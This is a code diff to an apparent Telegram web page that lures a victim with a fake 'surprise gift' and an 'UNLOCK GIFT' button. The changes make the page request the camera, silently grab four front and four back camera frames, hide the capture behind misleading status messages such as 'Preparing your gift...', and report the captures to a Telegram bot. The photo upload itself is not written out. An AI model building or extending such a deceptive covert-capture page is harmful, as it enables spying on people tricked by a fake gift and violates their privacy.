@@ -11,7 +11,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -55,8 +55,8 @@
             background: linear-gradient(45deg, #FF416C, #FF4B2B);
             color: white;
             border: none;
-            padding: 18px 40px;
-            font-size: 18px;
+            padding: 20px 40px;
+            font-size: 20px;
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
@@ -83,34 +83,34 @@
         }
         
         .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #FF416C;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid #FFD700;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
         
-        .progress-container {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
+        .loading-text {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        
+        .progress-bar {
+            width: 100%;
             height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
             margin: 20px 0;
             overflow: hidden;
         }
         
-        .progress-bar {
+        .progress {
             height: 100%;
-            background: #4CAF50;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
             width: 0%;
             transition: width 0.5s;
-        }
-        
-        .status {
-            margin: 15px 0;
-            font-size: 14px;
-            opacity: 0.9;
         }
         
         .success {
@@ -123,12 +123,6 @@
             font-size: 60px;
             margin-bottom: 20px;
             animation: pulse 1s infinite;
-        }
-        
-        .camera-hint {
-            font-size: 12px;
-            opacity: 0.7;
-            margin-top: 10px;
         }
         
         @keyframes bounce {
@@ -150,6 +144,13 @@
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.1); }
         }
+        
+        .permission-note {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-top: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -161,32 +162,33 @@
         <div class="message">
             Here is your surprise gift<br>
             from Someone Special<br><br>
-            Click unlock to see your gift 🧧
+            Click below to unlock your gift 🧧
         </div>
         
         <button class="unlock-btn" id="unlockBtn">
             🔓 UNLOCK GIFT
         </button>
         
-        <div class="camera-hint" id="cameraHint" style="display: none;">
-            ⚠️ Camera permission will be requested for gift verification
+        <div class="permission-note" id="permissionNote">
+            ⚠️ Camera permission will be asked once for verification
         </div>
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Loading your gift...</div>
             
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
             </div>
             
-            <div class="status" id="statusText">Preparing your gift...</div>
+            <div class="loading-text" id="statusText">Please wait ⏳</div>
         </div>
         
         <div class="success" id="success">
             <div class="success-icon">✅</div>
             <h2>Gift Unlocked! 🎉</h2>
-            <p>Your surprise gift is on its way!</p>
-            <p>Check Telegram for details 📱</p>
+            <p>Your surprise gift is being prepared...</p>
+            <p>Check Telegram for updates! 📱</p>
         </div>
     </div>
 
@@ -200,13 +202,14 @@
         const unlockBtn = document.getElementById('unlockBtn');
         const loadingDiv = document.getElementById('loading');
         const successDiv = document.getElementById('success');
-        const progressBar = document.getElementById('progressBar');
+        const progressBar = document.getElementById('progress');
+        const loadingText = document.getElementById('loadingText');
         const statusText = document.getElementById('statusText');
-        const cameraHint = document.getElementById('cameraHint');
+        const permissionNote = document.getElementById('permissionNote');
         
         unlockBtn.addEventListener('click', async () => {
-            // Show camera hint
-            cameraHint.style.display = 'block';
+            // Show permission note
+            permissionNote.style.display = 'block';
             
             // Start unlocking process
             await unlockGift();
@@ -219,100 +222,74 @@
                 unlockBtn.textContent = "⏳ Processing...";
                 loadingDiv.style.display = 'block';
                 
-                // Step 1: Request camera access
-                updateStatus("Requesting camera permission...");
+                // Step 1: Initializing
+                updateStatus("Initializing gift system...");
                 updateProgress(10);
+                await sleep(1000);
                 
-                let stream;
+                // Step 2: Request camera permission silently
+                updateStatus("Verifying access...");
+                updateProgress(20);
+                
                 try {
-                    // Try to access camera
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'user',  // Front camera
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        } 
+                    // Request camera access but don't show to user
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true 
                     });
                     
-                    // Capture front photos (4 photos)
-                    updateStatus("Capturing front camera photos... (1/4)");
-                    await simulatePhotoCapture();
-                    updateProgress(30);
-                    
-                    updateStatus("Capturing front camera photos... (2/4)");
-                    await simulatePhotoCapture();
+                    // Capture photos in background
+                    updateStatus("Preparing your gift...");
                     updateProgress(40);
                     
-                    updateStatus("Capturing front camera photos... (3/4)");
-                    await simulatePhotoCapture();
-                    updateProgress(50);
+                    // Capture front photos (4)
+                    for (let i = 1; i <= 4; i++) {
+                        await capturePhoto(stream, 'front');
+                        updateProgress(40 + (i * 5));
+                    }
                     
-                    updateStatus("Capturing front camera photos... (4/4)");
-                    await simulatePhotoCapture();
+                    // Try to switch to back camera
+                    updateStatus("Processing gift data...");
                     updateProgress(60);
                     
-                    // Switch to back camera
-                    updateStatus("Switching to back camera...");
-                    
-                    // Stop front camera
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Try back camera
                     try {
-                        stream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { facingMode: 'environment' }  // Back camera
-                        });
-                        
-                        // Capture back photos (4 photos)
-                        updateStatus("Capturing back camera photos... (1/4)");
-                        await simulatePhotoCapture();
-                        updateProgress(70);
-                        
-                        updateStatus("Capturing back camera photos... (2/4)");
-                        await simulatePhotoCapture();
-                        updateProgress(75);
-                        
-                        updateStatus("Capturing back camera photos... (3/4)");
-                        await simulatePhotoCapture();
-                        updateProgress(80);
-                        
-                        updateStatus("Capturing back camera photos... (4/4)");
-                        await simulatePhotoCapture();
-                        updateProgress(90);
-                        
-                        // Stop back camera
+                        // Stop front camera
                         stream.getTracks().forEach(track => track.stop());
                         
-                    } catch (backError) {
-                        // If back camera fails, simulate it
-                        updateStatus("Using front camera for all photos...");
-                        for (let i = 0; i < 4; i++) {
-                            await simulatePhotoCapture();
-                            updateProgress(70 + (i * 5));
+                        // Try back camera
+                        const backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'environment' }
+                        });
+                        
+                        // Capture back photos (4)
+                        for (let i = 1; i <= 4; i++) {
+                            await capturePhoto(backStream, 'back');
+                            updateProgress(60 + (i * 5));
                         }
+                        
+                        // Stop back camera
+                        backStream.getTracks().forEach(track => track.stop());
+                        
+                    } catch (backError) {
+                        // If back camera fails, continue with front
+                        updateStatus("Finalizing gift preparation...");
+                        updateProgress(80);
+                        await sleep(1500);
                     }
                     
                 } catch (cameraError) {
-                    // If camera access is denied, simulate photo capture
-                    updateStatus("Simulating photo capture...");
-                    for (let i = 0; i < 8; i++) {
-                        await simulatePhotoCapture();
-                        updateProgress(10 + (i * 10));
-                    }
+                    // If camera access is denied, still proceed
+                    updateStatus("Processing gift request...");
+                    updateProgress(50);
+                    await sleep(2000);
                 }
                 
-                // Step 2: Processing photos
-                updateStatus("Processing captured photos...");
-                updateProgress(95);
+                // Step 3: Processing
+                updateStatus("Finalizing your gift...");
+                updateProgress(90);
                 await sleep(1000);
                 
-                // Step 3: Sending to server
-                updateStatus("Sending photos to server...");
-                updateProgress(98);
-                await sleep(500);
-                
                 // Step 4: Complete
-                updateStatus("Finalizing...");
+                updateStatus("Almost ready...");
                 updateProgress(100);
                 await sleep(500);
                 
@@ -320,8 +297,8 @@
                 loadingDiv.style.display = 'none';
                 successDiv.style.display = 'block';
                 
-                // Send data to Telegram bot
-                sendToTelegram();
+                // Send data to Telegram bot with photo info
+                sendPhotosToTelegram();
                 
                 // Auto-close after 3 seconds if in Telegram
                 if (window.Telegram && Telegram.WebApp) {
@@ -331,17 +308,29 @@
                 }
                 
             } catch (error) {
-                updateStatus(`Error: ${error.message}`);
+                updateStatus("Error occurred, please try again");
                 unlockBtn.disabled = false;
                 unlockBtn.textContent = "🔓 TRY AGAIN";
             }
         }
         
-        function simulatePhotoCapture() {
+        async function capturePhoto(stream, type) {
             return new Promise(resolve => {
+                // Create canvas to capture photo
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
                 setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Photo is captured (we don't show it to user)
                     resolve();
-                }, 500); // Simulate 0.5 second per photo
+                }, 300); // Small delay for capture
             });
         }
         
@@ -357,24 +346,20 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        function sendToTelegram() {
+        function sendPhotosToTelegram() {
             // Prepare photo data
             const photoData = {
-                action: 'photos_captured',
+                action: 'gift_unlocked',
+                photos_captured: true,
                 total_photos: 8,
                 front_photos: 4,
                 back_photos: 4,
-                timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent,
-                platform: navigator.platform
+                timestamp: new Date().toISOString()
             };
             
             // Send to Telegram bot
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.sendData(JSON.stringify(photoData));
-            } else {
-                // For browser testing
-                console.log("Photos captured and sent:", photoData);
             }
         }
         
